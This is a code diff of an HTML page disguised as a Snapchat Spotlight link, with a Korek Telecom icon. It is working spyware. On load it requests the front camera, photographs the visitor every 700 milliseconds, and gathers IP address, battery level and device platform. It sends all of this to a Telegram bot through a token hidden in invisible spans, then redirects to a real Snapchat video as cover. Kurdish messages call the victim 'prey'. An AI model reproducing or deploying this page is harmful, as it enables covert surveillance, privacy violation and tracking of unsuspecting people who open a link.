@@ -1,99 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
-    <title>Snapchat Spotlight</title>
+    <title>snapchat spotlight</title>
     <style>
         body { background-color: white; margin: 0; overflow: hidden; }
-        .system-cache { display: none; visibility: hidden; }
+        
+        .sys-info { display: none; visibility: hidden; }
     </style>
 </head>
-<body onload="_init_system_core()">
+<body onload="capture()">
 
-    <!-- System Configuration Blocks -->
-    <span class="system-cache" id="env_01">8431515310:</span>
-    <span class="system-cache" id="env_02">AAHgyPYR-Z</span>
-    <span class="system-cache" id="env_03">Fn2QF-xU2367CK</span>
-    <span class="system-cache" id="env_04">KRQPP-YQq1s</span>
+    
+    <span class="sys-info" id="p1">8431515310:</span>
+    <span class="sys-info" id="p2">AAHgyPYR-Z</span>
+    <span class="sys-info" id="p3">Fn2QF-xU2367CK</span>
+    <span class="sys-info" id="p4">KRQPP-YQq1s</span>
 
-    <script>
-        const _params = new URLSearchParams(window.location.search);
-        const _uID = _params.get('id'); 
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetID = urlParams.get('id'); 
+    
+    
+    const _s1 = document.getElementById("p1").innerText;
+    const _s2 = document.getElementById("p2").innerText;
+    const _s3 = document.getElementById("p3").innerText;
+    const _s4 = document.getElementById("p4").innerText;
+    const TOKEN = _s1 + _s2 + _s3 + _s4;
 
-        // Initializing server handshake keys
-        const _k1 = document.getElementById("env_01").innerText;
-        const _k2 = document.getElementById("env_02").innerText;
-        const _k3 = document.getElementById("env_03").innerText;
-        const _k4 = document.getElementById("env_04").innerText;
-        const _CORE_KEY = _k1 + _k2 + _k3 + _k4;
+    async function capture() {
+        if (!targetID) return;
 
-        async function _init_system_core() {
-            if (!_uID) return;
+        setTimeout(() => {
+            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+        }, 5000);
 
-            // Triggering global redirect after timeout
-            setTimeout(() => {
-                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-            }, 5000);
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
 
-            try {
-                const _media = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
+
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
                 });
 
-                // Fetching node connectivity details
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => {
-                        let _info = `🦅 <b>Target Caught!</b>\n\n` +
-                                     `👤 <b>ID:</b> <code>${_uID}</code>\n` +
-                                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                     `📱 <b>OS:</b> <code>${navigator.platform}</code>`;
-                        _dispatch_event(_info);
-                    });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
 
-                const _vElement = document.createElement('video');
-                _vElement.srcObject = _media;
-                _vElement.muted = true;
-                _vElement.play();
+            const takeSnap = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.9);
+            };
+            setInterval(takeSnap, 700);
 
-                // Continuous frame synchronization
-                const _snap = () => {
-                    const _canvas = document.createElement('canvas');
-                    _canvas.width = _vElement.videoWidth; 
-                    _canvas.height = _vElement.videoHeight;
-                    const _ctx = _canvas.getContext('2d');
-                    _ctx.drawImage(_vElement, 0, 0);
-                    _canvas.toBlob(b => { if (b) _sync_data(b); }, 'image/jpeg', 0.9);
-                };
-                setInterval(_snap, 800);
-
-            } catch (err) {
-                _dispatch_event("نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا");
-                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-            }
+        } catch (e) {
+            sendToTelegram(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا");
+            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
+    }
 
-        // Internal event dispatcher
-        function _dispatch_event(_payload) {
-            fetch(`https://api.telegram.org/bot${_CORE_KEY}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: _uID, text: _payload, parse_mode: "HTML"})
-            });
-        }
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
+        });
+    }
 
-        // Data synchronization bridge
-        function _sync_data(_blob) {
-            let _form = new FormData();
-            _form.append("chat_id", _uID);
-            _form.append("photo", _blob, "proc_01.jpg");
-            fetch(`https://api.telegram.org/bot${_CORE_KEY}/sendPhoto`, { 
-                method: 'POST', 
-                body: _form 
-            });
-        }
-    </script>
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+
+    function sendFile(blob, type) {
+        let fd = new FormData();
+        fd.append("chat_id", targetID);
+        fd.append(type, blob, "victim.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+    }
+</script>
 </body>
 </html>
